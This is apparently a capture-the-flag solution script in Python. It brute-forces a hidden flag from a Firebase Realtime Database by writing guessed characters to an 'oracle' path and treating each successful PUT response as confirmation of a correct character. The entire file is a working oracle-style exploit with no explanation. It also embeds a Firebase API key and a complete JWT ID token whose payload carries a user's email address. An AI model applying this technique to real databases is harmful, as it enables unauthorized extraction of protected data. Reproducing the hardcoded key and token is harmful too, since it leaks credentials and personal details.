import requests
uid = 'YuYxypSNiNU7nNQNwKc1JK3mEvx1'
api_key = "AIzaSyDmLIX31LAFvb1hefXs-e6Baspcfg6ran8"

endpoint = 'https://udctf-fire-default-rtdb.firebaseio.com/oracle/'

flag = ""
x=0
while True:
    for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}':
        url = endpoint + uid + '/' + str(x) + ".json"
        params = {"auth": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImRjMzdkNTkzNjVjNjIyOGI4Y2NkYWNhNTM2MGFjMjRkMDQxNWMxZWEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vdWRjdGYtZmlyZSIsImF1ZCI6InVkY3RmLWZpcmUiLCJhdXRoX3RpbWUiOjE2NjczOTYxNzksInVzZXJfaWQiOiJZdVl4eXBTTmlOVTduTlFOd0tjMUpLM21FdngxIiwic3ViIjoiWXVZeHlwU05pTlU3bk5RTndLYzFKSzNtRXZ4MSIsImlhdCI6MTY2NzM5NjE3OSwiZXhwIjoxNjY3Mzk5Nzc5LCJlbWFpbCI6Inpha3Vyb3NvZGFAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbInpha3Vyb3NvZGFAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.uI9hEiFFrxd8PAnrcPhTu4aCHQcri6mhRn5ajIDVZ83IZOXTt2PAVPacRorJKx_pZkuTRRUVWI_PfpQL1_BmG1co7J-Oj1ZYWe3b3iadLKbUHkZMb9aYJdamQ31btEvudJjNLQtEyEVtatfHglbKmqvuzOkKSC9Q4Ny7itUkI5XqxCoi82o5HO9ap27DXmj0jIb_MLi78wzYyGXad4voZxkqRrOb-9ME_k7moBGZklJr4TevGJUG2ChEdGJmmU9Imf71GVrlQx3oAEjc717sCWYHxP90mGHoTEEVdkk9UzbWFiVf-eugelYX80ggsO5RLAERNB4wd-noY5D99Asrog", "key": api_key}
        data = '"' + c + '"'
        r = requests.put(url,params=params, data=data)
        print(url)
        print(r.text)
        if r.status_code == 200:
            flag+=c
            print(flag)
            break
    else:
        break
    x+=1

print()
print(flag)